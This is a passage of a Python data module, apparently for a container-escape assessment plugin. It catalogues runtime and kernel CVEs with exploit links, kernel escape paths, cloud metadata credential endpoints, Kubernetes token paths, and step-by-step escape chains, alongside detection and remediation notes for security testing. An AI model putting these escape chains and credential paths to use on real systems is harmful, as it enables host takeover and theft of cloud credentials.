        "public_exploit": True,
        "requires_privileged": False,
        "reliability": 0.70,
        "mitre_techniques": ["T1611"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-25809"]
    },
    "CVE-2023-27561": {
        "cvss": 7.0,
        "type": VulnerabilityType.CONTAINER_ESCAPE,
        "runtimes": [ContainerRuntime.RUNC],
        "affected_versions": ["runc < 1.1.5"],
        "fixed_versions": ["runc >= 1.1.5"],
        "description": "runc TOCTOU race condition during container setup",
        "public_exploit": True,
        "requires_privileged": False,
        "reliability": 0.50,
        "mitre_techniques": ["T1611", "T1068"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-27561"]
    },
    "CVE-2023-28642": {
        "cvss": 7.8,
        "type": VulnerabilityType.CONTAINER_ESCAPE,
        "runtimes": [ContainerRuntime.RUNC],
        "affected_versions": ["runc < 1.1.5"],
        "fixed_versions": ["runc >= 1.1.5"],
        "description": "runc AppArmor and SELinux bypass via /proc",
        "public_exploit": True,
        "requires_privileged": False,
        "reliability": 0.75,
        "mitre_techniques": ["T1611", "T1562"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-28642"]
    },
    
    # =========================================================================
    # Kernel CVEs
    # =========================================================================
    "CVE-2016-5195": {
        "cvss": 7.8,
        "type": VulnerabilityType.PRIVILEGE_ESCALATION,
        "runtimes": [ContainerRuntime.DOCKER, ContainerRuntime.CONTAINERD, ContainerRuntime.PODMAN],
        "affected_versions": ["Linux kernel < 4.8.3", "< 4.7.9", "< 4.4.26"],
        "fixed_versions": ["Linux kernel >= 4.8.3"],
        "affected_kernels": ["2.x", "3.x", "4.0-4.8.2"],
        "description": "Dirty COW - race condition in copy-on-write allows privilege escalation",
        "public_exploit": True,
        "exploit_url": "https://github.com/dirtycow/dirtycow.github.io",
        "requires_privileged": False,
        "reliability": 0.95,
        "mitre_techniques": ["T1068", "T1611"],
        "detection_method": "Check kernel version",
        "references": ["https://dirtycow.ninja/"]
    },
    "CVE-2022-0185": {
        "cvss": 8.4,
        "type": VulnerabilityType.CONTAINER_ESCAPE,
        "runtimes": [ContainerRuntime.DOCKER, ContainerRuntime.CONTAINERD, ContainerRuntime.PODMAN],
        "affected_versions": ["Linux kernel 5.1 - 5.16.2"],
        "fixed_versions": ["Linux kernel >= 5.16.2"],
        "description": "Heap overflow in legacy_parse_param allows container escape",
        "public_exploit": True,
        "requires_capabilities": ["CAP_SYS_ADMIN"],
        "reliability": 0.70,
        "mitre_techniques": ["T1611", "T1068"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2022-0185"]
    },
    "CVE-2022-0492": {
        "cvss": 7.8,
        "type": VulnerabilityType.CONTAINER_ESCAPE,
        "runtimes": [ContainerRuntime.DOCKER, ContainerRuntime.CONTAINERD, ContainerRuntime.PODMAN],
        "affected_versions": ["Linux kernel < 5.17"],
        "fixed_versions": ["Linux kernel >= 5.17"],
        "description": "cgroup v1 release_agent escape - allows code execution on host",
        "public_exploit": True,
        "exploit_url": "https://github.com/chenaotian/CVE-2022-0492",
        "requires_capabilities": ["CAP_SYS_ADMIN"],
        "reliability": 0.90,
        "mitre_techniques": ["T1611", "T1068"],
        "detection_method": "Check kernel version and cgroup v1 release_agent writability",
        "exploitation_notes": "Requires CAP_SYS_ADMIN and cgroup v1 with writable release_agent",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2022-0492"]
    },
    "CVE-2022-0847": {
        "cvss": 7.8,
        "type": VulnerabilityType.PRIVILEGE_ESCALATION,
        "runtimes": [ContainerRuntime.DOCKER, ContainerRuntime.CONTAINERD, ContainerRuntime.PODMAN],
        "affected_versions": ["Linux kernel 5.8 - 5.16.11", "5.15.25", "5.10.102"],
        "fixed_versions": ["Linux kernel >= 5.16.11", ">= 5.15.25", ">= 5.10.102"],
        "description": "Dirty Pipe - arbitrary file overwrite via splice() allows privilege escalation",
        "public_exploit": True,
        "exploit_url": "https://dirtypipe.cm4all.com/",
        "requires_privileged": False,
        "reliability": 0.95,
        "mitre_techniques": ["T1068", "T1548", "T1611"],
        "detection_method": "Check kernel version",
        "exploitation_notes": "Can overwrite any file, including /etc/passwd for root access",
        "references": ["https://dirtypipe.cm4all.com/"]
    },
}

# Kernel escape paths
KERNEL_ESCAPE_PATHS: Dict[str, Dict[str, Any]] = {
    "core_pattern": {
        "path": "/proc/sys/kernel/core_pattern",
        "method": EscapeMethod.CORE_PATTERN,
        "description": "Core dump handler - can execute arbitrary commands on host",
        "requires": ["CAP_SYS_ADMIN", "write access"],
        "severity": SeverityLevel.CRITICAL
    },
    "modprobe_path": {
        "path": "/proc/sys/kernel/modprobe",
        "method": EscapeMethod.MODPROBE_PATH,
        "description": "Module loader path - can be changed to execute arbitrary binary",
        "requires": ["CAP_SYS_ADMIN", "write access"],
        "severity": SeverityLevel.CRITICAL
    },
    "uevent_helper": {
        "path": "/sys/kernel/uevent_helper",
        "method": EscapeMethod.UEVENT_HELPER,
        "description": "Userspace event helper - executes on device events",
        "requires": ["CAP_SYS_ADMIN", "write access"],
        "severity": SeverityLevel.CRITICAL
    },
    "release_agent": {
        "path": "/sys/fs/cgroup/*/release_agent",
        "method": EscapeMethod.CGROUP_RELEASE_AGENT,
        "description": "Cgroup release agent - executes when cgroup becomes empty",
        "requires": ["CAP_SYS_ADMIN", "cgroup v1"],
        "severity": SeverityLevel.CRITICAL
    },
}

# Cloud metadata endpoints
CLOUD_METADATA_ENDPOINTS: Dict[str, Dict[str, Any]] = {
    "aws": {
        "base_url": "http://169.254.169.254",
        "token_endpoint": "/latest/api/token",
        "metadata_endpoint": "/latest/meta-data/",
        "credentials_endpoint": "/latest/meta-data/iam/security-credentials/",
        "userdata_endpoint": "/latest/user-data",
        "provider": CloudProvider.AWS,
        "method": EscapeMethod.AWS_IMDS
    },
    "gcp": {
        "base_url": "http://metadata.google.internal",
        "metadata_endpoint": "/computeMetadata/v1/",
        "headers": {"Metadata-Flavor": "Google"},
        "provider": CloudProvider.GCP,
        "method": EscapeMethod.GCP_METADATA
    },
    "azure": {
        "base_url": "http://169.254.169.254",
        "metadata_endpoint": "/metadata/instance",
        "headers": {"Metadata": "true"},
        "provider": CloudProvider.AZURE,
        "method": EscapeMethod.AZURE_IMDS
    },
}

# Kubernetes paths
K8S_PATHS: Dict[str, str] = {
    "token": "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "ca": "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
    "namespace": "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
}

# Escape method metadata with MITRE mapping
ESCAPE_METHOD_INFO: Dict[EscapeMethod, Dict[str, Any]] = {
    EscapeMethod.DOCKER_SOCK: {
        "severity": SeverityLevel.CRITICAL,
        "mitre": ["T1611", "T1610"],
        "description": "Docker socket exposed - full Docker daemon access",
        "remediation": "Remove docker.sock mount or use docker-proxy"
    },
    EscapeMethod.CORE_PATTERN: {
        "severity": SeverityLevel.CRITICAL,
        "mitre": ["T1611", "T1059"],
        "description": "core_pattern allows arbitrary command execution on crash",
        "remediation": "Mount /proc/sys read-only, drop CAP_SYS_ADMIN"
    },
    EscapeMethod.CGROUP_RELEASE_AGENT: {
        "severity": SeverityLevel.CRITICAL,
        "mitre": ["T1611", "T1059"],
        "description": "cgroup release_agent allows host command execution",
        "remediation": "Use cgroup v2, drop CAP_SYS_ADMIN"
    },
    EscapeMethod.EBPF_EXPLOIT: {
        "severity": SeverityLevel.CRITICAL,
        "mitre": ["T1611", "T1068"],
        "description": "eBPF allows kernel exploitation",
        "remediation": "Drop CAP_BPF, restrict unprivileged_bpf_disabled"
    },
    EscapeMethod.IMDS_ACCESS: {
        "severity": SeverityLevel.HIGH,
        "mitre": ["T1552", "T1078"],
        "description": "Cloud metadata service accessible - credential theft",
        "remediation": "Block 169.254.169.254, use IMDSv2 with hop limit"
    },
    EscapeMethod.K8S_SERVICE_ACCOUNT: {
        "severity": SeverityLevel.HIGH,
        "mitre": ["T1552", "T1078"],
        "description": "Kubernetes service account token accessible",
        "remediation": "Disable automountServiceAccountToken, use RBAC"
    },
    EscapeMethod.ARP_SPOOFING: {
        "severity": SeverityLevel.HIGH,
        "mitre": ["T1557", "T1040"],
        "description": "ARP spoofing possible with CAP_NET_RAW",
        "remediation": "Drop CAP_NET_RAW, use network policies"
    },
    EscapeMethod.TIOCSTI_INJECTION: {
        "severity": SeverityLevel.HIGH,
        "mitre": ["T1055"],
        "description": "TTY input injection via TIOCSTI ioctl",
        "remediation": "Use seccomp to block TIOCSTI"
    },
}

# Exploit chains - Complex multi-step escapes
EXPLOIT_CHAINS: List[Dict[str, Any]] = [
    {
        "name": "Docker Socket to Root Shell",
        "steps": [
            EscapeMethod.DOCKER_SOCK,
        ],
        "step_descriptions": [
            "Access Docker socket",
            "Create privileged container with host mount",
            "chroot to host filesystem",
            "Execute commands as root"
        ],
        "requires_docker_sock": True,
        "success_rate": 0.95,
        "complexity": "low",
        "mitre": ["T1611", "T1610"]
    },
    {
        "name": "CAP_SYS_ADMIN to Host via core_pattern",
        "steps": [
            EscapeMethod.CAP_SYS_ADMIN,
            EscapeMethod.CORE_PATTERN
        ],
        "step_descriptions": [
            "Verify CAP_SYS_ADMIN capability",
            "Write payload to /proc/sys/kernel/core_pattern",
            "Trigger core dump",
            "Payload executes on host"
        ],
        "required_capabilities": ["CAP_SYS_ADMIN"],
        "success_rate": 0.85,
        "complexity": "medium",
        "mitre": ["T1611", "T1059"]
    },
    {
        "name": "CAP_SYS_ADMIN to Host via release_agent",
        "steps": [
            EscapeMethod.CAP_SYS_ADMIN,
            EscapeMethod.CGROUP_RELEASE_AGENT
        ],
        "step_descriptions": [
            "Verify CAP_SYS_ADMIN capability",
            "Create cgroup and set release_agent",
            "Trigger cgroup cleanup",
            "release_agent executes on host"
        ],
        "required_capabilities": ["CAP_SYS_ADMIN"],
        "success_rate": 0.90,
        "complexity": "medium",
        "mitre": ["T1611", "T1059"]
    },
    {
        "name": "Privileged Container Full Escape",
        "steps": [
            EscapeMethod.PRIVILEGED_CONTAINER,
            EscapeMethod.DISK_DEVICE,
            EscapeMethod.HOST_MOUNT
        ],
        "step_descriptions": [
            "Confirm privileged mode",
            "Access host disk device (/dev/sda)",
            "Mount host filesystem",
            "Full host access achieved"
        ],
        "requires_privileged": True,
        "success_rate": 0.95,
        "complexity": "low",
        "mitre": ["T1611", "T1068"]
    },
    {
        "name": "Cloud Metadata Credential Theft",
        "steps": [
            EscapeMethod.IMDS_ACCESS,
            EscapeMethod.AWS_IMDS
        ],
        "step_descriptions": [
            "Detect cloud environment",
            "Query metadata service",
            "Extract IAM credentials",
            "Access cloud resources"
        ],
        "success_rate": 0.80,
        "complexity": "low",
        "mitre": ["T1552", "T1078"]
    },
    {
        "name": "Kubernetes API Escalation",
        "steps": [
            EscapeMethod.K8S_SERVICE_ACCOUNT,
            EscapeMethod.K8S_API_ACCESS,
            EscapeMethod.K8S_SECRETS
        ],
        "step_descriptions": [
            "Extract service account token",
            "Connect to Kubernetes API",
            "Enumerate permissions",
            "Access secrets or create privileged pods"
        ],
        "success_rate": 0.70,
        "complexity": "medium",
        "mitre": ["T1552", "T1078", "T1613"]
    },
]


# =============================================================================
# Alternative Runtime Escape Techniques
# =============================================================================

ALTERNATIVE_RUNTIME_ESCAPES: Dict[str, Dict[str, Any]] = {
    # Rootless Container Escapes
    "rootless_user_namespace": {
        "runtime": "rootless",
        "severity": SeverityLevel.CRITICAL,
        "description": "User namespace escape in rootless mode via CVE exploitation",
        "applicable_to": ["docker", "podman"],
        "requirements": ["Kernel user namespace vulnerabilities", "Specific kernel versions"],
        "techniques": [
            "Abuse of user namespace UID/GID mapping",
            "Newuidmap/newgidmap setuid binary abuse",
            "/proc/self/setgroups manipulation",
            "Subuid/subgid misconfiguration exploitation",
        ],
        "mitre": ["T1611", "T1068"],
        "detection": "Check kernel version, user namespace config, setuid binaries",
    },
    "rootless_fuse_abuse": {
        "runtime": "rootless",
        "severity": SeverityLevel.HIGH,
        "description": "Rootless FUSE filesystem abuse for privilege escalation",
        "applicable_to": ["docker", "podman"],
        "requirements": ["fuse-overlayfs access", "Specific FUSE vulnerabilities"],
        "techniques": [
            "FUSE filesystem race conditions",
            "fuse-overlayfs symlink attacks",
            "FUSE mount point manipulation",
        ],
        "mitre": ["T1068"],
        "detection": "Check fuse-overlayfs version, FUSE configuration",
    },
    "rootless_slirp4netns": {
        "runtime": "rootless",
        "severity": SeverityLevel.MEDIUM,
        "description": "slirp4netns network stack vulnerabilities",
        "applicable_to": ["docker", "podman"],
        "requirements": ["slirp4netns vulnerabilities"],
        "techniques": [
            "slirp4netns buffer overflow",
            "Network namespace escape via slirp bugs",
            "UDP packet processing vulnerabilities",
        ],
        "mitre": ["T1040", "T1557"],
        "detection": "Check slirp4netns version",
    },
    
    # Kata Containers Escapes
    "kata_vsock_escape": {
        "runtime": "kata",
        "severity": SeverityLevel.CRITICAL,
        "description": "Kata Containers VM escape via vsock vulnerabilities",
        "applicable_to": ["kata-runtime"],
        "requirements": ["vsock vulnerabilities", "Hypervisor bugs"],
        "techniques": [
            "vsock buffer overflow",
            "Agent communication hijacking",
            "vsock-based information disclosure",
        ],
        "mitre": ["T1611", "T1068"],
        "detection": "Check Kata agent version, vsock configuration",
    },
    "kata_agent_rpc": {
        "runtime": "kata",
        "severity": SeverityLevel.HIGH,
        "description": "Kata agent RPC exploitation",
        "applicable_to": ["kata-runtime"],
        "requirements": ["Agent RPC vulnerabilities", "Unauthenticated access"],
        "techniques": [
            "Unauthenticated RPC calls",
            "Agent command injection",
            "RPC message manipulation",
        ],
        "mitre": ["T1021", "T1059"],
        "detection": "Check agent authentication, RPC configuration",
    },
    "kata_hypervisor_escape": {
        "runtime": "kata",
        "severity": SeverityLevel.CRITICAL,
        "description": "QEMU/Cloud Hypervisor escape affecting Kata",
        "applicable_to": ["kata-runtime"],
        "requirements": ["Hypervisor CVEs (QEMU, Cloud Hypervisor, Firecracker)"],
        "techniques": [
            "QEMU device emulation bugs",
            "virtio vulnerabilities",
            "Memory corruption in hypervisor",
        ],
        "mitre": ["T1611", "T1068"],
        "detection": "Check hypervisor version (QEMU, Cloud Hypervisor)",
    },
    
    # gVisor Escapes
    "gvisor_sentry_escape": {
        "runtime": "gvisor",
        "severity": SeverityLevel.CRITICAL,
        "description": "gVisor Sentry kernel escape",
        "applicable_to": ["gvisor", "runsc"],
        "requirements": ["Sentry syscall implementation bugs"],
        "techniques": [
            "Syscall emulation bypass",
            "Sentry memory corruption",
            "Go runtime vulnerabilities",
        ],
        "mitre": ["T1611", "T1068"],
        "detection": "Check runsc version, Sentry configuration",
    },
    "gvisor_gofer_escape": {
        "runtime": "gvisor",
        "severity": SeverityLevel.HIGH,
        "description": "gVisor Gofer filesystem escape",
        "applicable_to": ["gvisor", "runsc"],
        "requirements": ["Gofer vulnerabilities", "9P protocol bugs"],
        "techniques": [
            "9P filesystem protocol exploitation",
            "Gofer process escape",
            "File descriptor leakage",
        ],
        "mitre": ["T1083", "T1068"],
        "detection": "Check Gofer configuration, 9P security",
    },
    
    # Firecracker Escapes
    "firecracker_mmds_abuse": {
        "runtime": "firecracker",
        "severity": SeverityLevel.MEDIUM,
        "description": "Firecracker MMDS (Microvm Metadata Service) abuse",
        "applicable_to": ["firecracker"],
        "requirements": ["MMDS misconfiguration"],
        "techniques": [
            "Metadata service information disclosure",
            "MMDS rate limiting bypass",
            "Cross-VM metadata access",
        ],
        "mitre": ["T1552", "T1082"],
        "detection": "Check MMDS configuration and access controls",
    },
    "firecracker_virtio_escape": {
        "runtime": "firecracker",
        "severity": SeverityLevel.CRITICAL,
        "description": "Firecracker virtio device escape",
        "applicable_to": ["firecracker"],
        "requirements": ["virtio implementation vulnerabilities"],
        "techniques": [
            "virtio-net exploitation",
            "virtio-block vulnerabilities",
            "Shared memory corruption",
        ],
        "mitre": ["T1611", "T1068"],
        "detection": "Check Firecracker version, virtio configuration",
    },
    
    # WasmEdge/WebAssembly Escapes
    "wasm_sandbox_escape": {
        "runtime": "wasmedge",
        "severity": SeverityLevel.CRITICAL,
        "description": "WebAssembly sandbox escape",
        "applicable_to": ["wasmedge", "wasmtime", "wasmer"],
        "requirements": ["WASM runtime vulnerabilities"],
        "techniques": [
            "WASM linear memory corruption",
            "Host function call abuse",
            "WASI capability bypass",
        ],
        "mitre": ["T1611", "T1068"],
        "detection": "Check WASM runtime version, WASI configuration",
    },
}


# =============================================================================
# Namespace-specific Escape Techniques
# =============================================================================

NAMESPACE_ESCAPES: Dict[str, Dict[str, Any]] = {
    "user_namespace": {
        "description": "User namespace escape techniques",
        "severity": SeverityLevel.CRITICAL,
        "techniques": [
            {
                "name": "CVE-based user namespace escape",
                "description": "Exploit kernel CVEs affecting user namespaces",
                "kernel_cves": ["CVE-2022-0185", "CVE-2022-25636", "CVE-2023-0386"],
                "check": "Check kernel version and user namespace vulnerabilities",
            },
            {
                "name": "Nested namespace escape",
                "description": "Abuse nested namespaces for privilege escalation",
                "requirements": ["nested_namespace_support"],
                "check": "Check /proc/sys/user/max_user_namespaces",
            },
            {
                "name": "setuid binary abuse",
                "description": "Abuse setuid binaries accessible in user namespace",
                "binaries": ["newuidmap", "newgidmap", "fusermount"],
                "check": "Check for vulnerable setuid binaries",
            },
        ],
    },
    "mount_namespace": {
        "description": "Mount namespace escape techniques",
        "severity": SeverityLevel.HIGH,
        "techniques": [
            {
                "name": "Shared mount propagation",
                "description": "Escape via shared mount propagation",
                "check": "Check mount propagation settings (cat /proc/self/mountinfo)",
            },
            {
                "name": "Bind mount escape",
                "description": "Abuse misconfigured bind mounts to access host",
                "check": "Check for writable bind mounts to sensitive paths",
            },
            {
                "name": "OverlayFS escape",
                "description": "Escape via OverlayFS vulnerabilities (CVE-2023-0386)",
                "check": "Check kernel version for OverlayFS CVEs",
            },
        ],
    },
    "pid_namespace": {
        "description": "PID namespace escape techniques",
        "severity": SeverityLevel.MEDIUM,
        "techniques": [
            {
                "name": "Process injection via /proc",
                "description": "Inject into host processes via /proc access",
                "requirements": ["CAP_SYS_PTRACE or privileged"],
                "check": "Check /proc visibility and ptrace permissions",
            },
            {
                "name": "PID 1 signaling",
                "description": "Signal host init process to cause DoS or side effects",
                "requirements": ["Signal permissions to host PIDs"],
                "check": "Check if host PIDs are visible and signalable",
            },
        ],
    },
    "network_namespace": {
        "description": "Network namespace escape techniques",
        "severity": SeverityLevel.HIGH,
        "techniques": [
            {
                "name": "Host network access",
                "description": "Direct host network access when --net=host",
                "check": "Check network namespace (ls -la /proc/1/ns/net vs /proc/self/ns/net)",
            },
            {
                "name": "veth pair exploitation",
                "description": "Exploit veth pair for network-based attacks",
                "requirements": ["CAP_NET_ADMIN or CAP_NET_RAW"],
                "check": "Check network capabilities and veth configuration",
            },
            {
                "name": "Network namespace join",
                "description": "Join host network namespace via setns",
                "requirements": ["CAP_SYS_ADMIN and access to host namespace files"],
                "check": "Check setns permissions and /proc/1/ns/net access",
            },
        ],
    },
    "ipc_namespace": {
        "description": "IPC namespace escape techniques",
        "severity": SeverityLevel.MEDIUM,
        "techniques": [
            {
                "name": "Shared memory access",
                "description": "Access host shared memory when IPC namespace is shared",
                "check": "Check IPC namespace (ls -la /proc/1/ns/ipc vs /proc/self/ns/ipc)",
            },
            {
                "name": "Message queue exploitation",
                "description": "Exploit shared message queues for communication with host",
                "check": "Check for accessible message queues (ipcs -q)",
            },
        ],
    },
}


# =============================================================================
# Runtime Security Bypass Techniques
# =============================================================================

SECCOMP_BYPASS_TECHNIQUES: Dict[str, Dict[str, Any]] = {
    "seccomp_disabled": {
        "description": "Container running without seccomp profile",
        "severity": SeverityLevel.CRITICAL,
        "detection": "Check seccomp status: cat /proc/self/status | grep Seccomp",
        "indicators": ["Seccomp:\t0", "seccomp=unconfined"],
        "impact": "All syscalls available, full escape potential",
        "mitre": ["T1562.001"],
    },
    "seccomp_notify_abuse": {
        "description": "Abuse seccomp notification mechanism (SECCOMP_RET_USER_NOTIF)",
        "severity": SeverityLevel.HIGH,
        "requirements": ["Kernel >= 5.0", "seccomp_unotify support"],
        "techniques": [
            "Race condition in notification handling",
            "TOCTOU attacks via notification",
            "Supervisor process impersonation",
        ],
        "mitre": ["T1068"],
    },
    "seccomp_ptrace_bypass": {
        "description": "Bypass seccomp via ptrace if allowed",
        "severity": SeverityLevel.CRITICAL,
        "requirements": ["CAP_SYS_PTRACE or ptrace allowed in profile"],
        "techniques": [
            "Attach to process without seccomp filter",
            "Inject syscalls via ptrace POKEDATA",
            "Hijack syscall parameters",
        ],
        "check": "Check if ptrace is in seccomp allowlist",
        "mitre": ["T1055", "T1562.001"],
    },
    "seccomp_kernel_cve": {
        "description": "Kernel CVEs affecting seccomp implementation",
        "severity": SeverityLevel.CRITICAL,
        "cves": [
            {
                "id": "CVE-2021-33200",
                "description": "Seccomp filter bypass via BPF verifier bug",
                "affected_kernels": ["< 5.12.4", "< 5.11.21", "< 5.10.37"],
            },
            {
                "id": "CVE-2022-30594",
                "description": "Seccomp bypass via ptrace regression",
                "affected_kernels": ["5.16.x - 5.17.x (some)"],
            },
        ],
        "check": "Check kernel version for seccomp CVEs",
        "mitre": ["T1068"],
    },
    "seccomp_architecture_bypass": {
        "description": "Bypass seccomp via architecture confusion",
        "severity": SeverityLevel.MEDIUM,
        "techniques": [
            "x32 ABI syscall confusion",
            "compat syscall table exploitation",
            "Multiarch container escape",
        ],
        "requirements": ["Multi-arch kernel", "x32 ABI enabled"],
        "check": "Check for x32 ABI support: grep x32 /proc/cpuinfo",
        "mitre": ["T1562.001"],
    },
    "seccomp_bpf_complexity": {
        "description": "Exploit seccomp BPF filter complexity limits",
        "severity": SeverityLevel.LOW,
        "techniques": [
            "Exceed filter instruction limit",
            "Filter chain exhaustion",
            "BPF verifier timing attacks",
        ],
        "check": "Analyze seccomp filter complexity",
        "mitre": ["T1562.001"],
    },
    "seccomp_signal_bypass": {
        "description": "Bypass via signal handling edge cases",
        "severity": SeverityLevel.LOW,
        "techniques": [
            "Signal coalescing abuse",
            "SIGSYS handler manipulation",
            "Signal race conditions",
        ],
        "mitre": ["T1562.001"],
    },
}


APPARMOR_CONTAINER_BYPASS: Dict[str, Dict[str, Any]] = {
    "apparmor_disabled": {
        "description": "Container running without AppArmor profile",
        "severity": SeverityLevel.CRITICAL,
        "detection": "Check AppArmor: cat /proc/self/attr/current",
        "indicators": ["unconfined", "docker-default (complain)"],
        "impact": "No file/capability restrictions from AppArmor",
        "mitre": ["T1562.001"],
    },
    "docker_default_bypass": {
        "description": "Bypass docker-default AppArmor profile weaknesses",
        "severity": SeverityLevel.HIGH,
        "techniques": [
            {
                "name": "mount propagation escape",
                "description": "Docker default profile doesn't block mount propagation abuse",
                "check": "Check mount capabilities and propagation settings",
            },
            {
                "name": "signal limitation gaps",
                "description": "Some signals not restricted by docker-default",
                "check": "Test signal sending capabilities",
            },
            {
                "name": "abstract unix socket access",
                "description": "Abstract Unix sockets not fully restricted",
                "check": "Check for accessible abstract sockets",
            },
        ],
        "mitre": ["T1562.001"],
    },
    "apparmor_profile_parsing": {
        "description": "Exploit AppArmor profile parsing weaknesses",
        "severity": SeverityLevel.MEDIUM,
        "techniques": [
            "Path traversal in profile rules",
            "Glob pattern exploitation",
            "Link following edge cases",
            "Wildcard rule abuse",
        ],
        "mitre": ["T1562.001"],
    },
    "apparmor_stacking_escape": {
        "description": "Escape via AppArmor policy stacking",
        "severity": SeverityLevel.MEDIUM,
        "requirements": ["AppArmor policy stacking enabled"],
        "techniques": [
            "Change to less restrictive stacked profile",
            "Profile transition exploitation",
            "Namespace label manipulation",
        ],
        "check": "Check for AppArmor stacking: cat /sys/kernel/security/apparmor/features/domain/stack",
        "mitre": ["T1562.001"],
    },
    "apparmor_kernel_cve": {
        "description": "Kernel CVEs affecting AppArmor",
        "severity": SeverityLevel.CRITICAL,
        "cves": [
            {
                "id": "CVE-2022-27666",
                "description": "AppArmor heap buffer overflow",
                "affected_kernels": ["< 5.16.10", "< 5.15.24"],
            },
            {
                "id": "CVE-2021-3847",
                "description": "AppArmor access control bypass",
                "affected_kernels": ["Various"],
            },
        ],
        "check": "Check kernel version for AppArmor CVEs",
        "mitre": ["T1068"],
    },
    "aa_exec_bypass": {
        "description": "Bypass via aa-exec or profile change",
        "severity": SeverityLevel.MEDIUM,
        "techniques": [
            "Use aa-exec to run unconfined",
            "Change profile at runtime if allowed",
            "Exploit profile transition rules",
        ],
        "check": "Check for aa-exec availability and change_profile hat",
        "mitre": ["T1562.001"],
    },
}


SELINUX_CONTAINER_BYPASS: Dict[str, Dict[str, Any]] = {
    "selinux_disabled": {
        "description": "SELinux disabled or in permissive mode for container",
        "severity": SeverityLevel.CRITICAL,
        "detection": "Check: sestatus; cat /proc/self/attr/current",
        "indicators": ["disabled", "permissive", "spc_t", "unconfined_t"],
        "impact": "No SELinux restrictions apply",
        "mitre": ["T1562.001"],
    },
    "container_spc_type": {
        "description": "Container running as super privileged container (spc_t)",
        "severity": SeverityLevel.CRITICAL,
        "detection": "cat /proc/self/attr/current | grep spc_t",
        "techniques": [
            "Full host access via spc_t",
            "Mount host filesystems",
            "Access host network stack",
        ],
        "mitre": ["T1562.001", "T1611"],
    },
    "selinux_type_transition": {
        "description": "Exploit SELinux type transitions",
        "severity": SeverityLevel.MEDIUM,
        "techniques": [
            "Trigger domain transition to privileged type",
            "Exploit entrypoint executables",
            "Type transition via setexec",
        ],
        "check": "Check type_transition rules: sesearch -T",
        "mitre": ["T1562.001"],
    },
    "selinux_mcs_bypass": {
        "description": "Bypass MCS (Multi-Category Security) labels",
        "severity": SeverityLevel.HIGH,
        "techniques": [
            "Category range exploitation",
            "MCS label inheritance abuse",
            "Cross-container MCS access",
        ],
        "check": "Check container MCS labels: ps -eZ",
        "mitre": ["T1562.001"],
    },
    "container_selinux_cve": {
        "description": "CVEs in container-selinux policies",
        "severity": SeverityLevel.HIGH,
        "cves": [
            {
                "id": "CVE-2021-3419",
                "description": "Container escape via container-selinux policy flaw",
                "affected": ["container-selinux < 2.124"],
            },
        ],
        "check": "Check container-selinux version: rpm -q container-selinux",
        "mitre": ["T1068"],
    },
}


# Combined Runtime Security Bypass Database
RUNTIME_SECURITY_BYPASS: Dict[str, Dict[str, Any]] = {
    "no_security_modules": {
        "description": "Container running without any security modules",
        "severity": SeverityLevel.CRITICAL,
        "detection": [
            "Seccomp: cat /proc/self/status | grep Seccomp (expect 0)",
            "AppArmor: cat /proc/self/attr/current (expect unconfined)",
            "SELinux: cat /proc/self/attr/current (expect unconfined_t)",
        ],
        "impact": "No runtime security restrictions - maximum escape potential",
        "mitre": ["T1562.001"],
    },
    "privileged_container": {
        "description": "Container running in privileged mode",
        "severity": SeverityLevel.CRITICAL,
        "detection": "Check for elevated capabilities and device access",
        "indicators": [
            "All capabilities enabled",
            "Access to /dev/sda, /dev/mem",
            "No seccomp/apparmor/selinux restrictions",
            "Host PID namespace",
        ],
        "escape_methods": [
            "Mount host filesystem",
            "Access host devices directly",
            "Load kernel modules",
            "Manipulate host processes",
        ],
        "mitre": ["T1611", "T1068"],
    },
    "capabilities_vs_seccomp_mismatch": {
        "description": "Capabilities granted but syscalls blocked by seccomp",
        "severity": SeverityLevel.MEDIUM,
        "techniques": [
            "Find gaps between capability and seccomp restrictions",
            "Exploit capability-enabled but unblocked syscalls",
        ],
        "check": "Compare capabilities (capsh --print) vs seccomp profile",
        "mitre": ["T1562.001"],
    },
    "cgroup_v2_bypass": {
        "description": "Bypass cgroup v2 restrictions",
        "severity": SeverityLevel.HIGH,
        "techniques": [
            "cgroup controller manipulation",
            "cgroup namespace escape",
            "Device controller bypass",
            "Memory cgroup exploitation",
        ],
        "requirements": ["cgroup v2 enabled", "Some cgroup capabilities"],
        "mitre": ["T1611"],
    },
}


# =============================================================================
# Plugin Class
# =============================================================================

